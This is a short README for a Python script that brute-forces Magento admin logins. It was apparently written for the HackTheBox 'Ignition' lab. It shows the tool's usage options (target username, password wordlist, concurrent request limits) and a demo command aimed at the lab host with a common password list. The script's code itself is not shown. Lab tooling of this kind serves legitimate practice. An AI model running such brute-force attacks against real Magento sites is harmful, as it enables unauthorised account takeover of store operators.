# Yet another Magento Login Bruteforcer

Just for convenience and as a PoC.


## Tested with

This script is tested against:
- **Magento ver. dev-2.4-develop**
- python **3.11.4**


## How it works

```
python magentoBf.py -h

usage: magentoBf.py [-h] [-u U] [-w W] [-m M] [-t T] url

Yet another Magento login Bruteforce script.

positional arguments:
  url         The url where the Magento login is located

options:
  -h, --help  show this help message and exit
  -u U        The username to bruteforce the password. Defaults to admin
  -w W        The password wordlist fullpath to use
  -m M        Number. Max concurrent calls to try to schedulle. Defaults to 100.
  -t T        Number. Time to wait between max concurrent blocks. Defaults to 1 secs.

```

## Demo

Created for and used with **Ignition** box in **HTB**.

```
python magentoBf.py http://ignition.htb/admin -u admin -w /opt/SecLists/Passwords/xato-net-10-million-passwords-10000.txt
```

![Demo bruteforce ignition](images/magento_bf_demo.gif)
